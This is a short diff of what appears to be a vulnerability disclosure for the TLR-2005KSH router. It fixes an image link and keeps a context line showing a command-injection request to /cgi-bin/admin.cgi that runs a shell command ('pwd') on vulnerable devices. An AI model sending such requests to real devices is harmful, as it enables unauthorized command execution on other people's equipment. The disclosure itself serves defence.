@@ -12,7 +12,7 @@ By inputting the following payload to access vulnerable devices, an attacker can
 
 /cgi-bin/admin.cgi?Command=sysCommand&Cmd=pwd
 
-![1734088373076](C:\Users\zzcun\Desktop\TLR-2005KSH\assets\1734088373076.jpg)
+![1734088373076](https://raw.githubusercontent.com/kklzzcun/route/main/TLR-2005KSH/assets/1734088373076.jpg)
 
 This vulnerability affects known product versions: 2.6.36 and later.
 
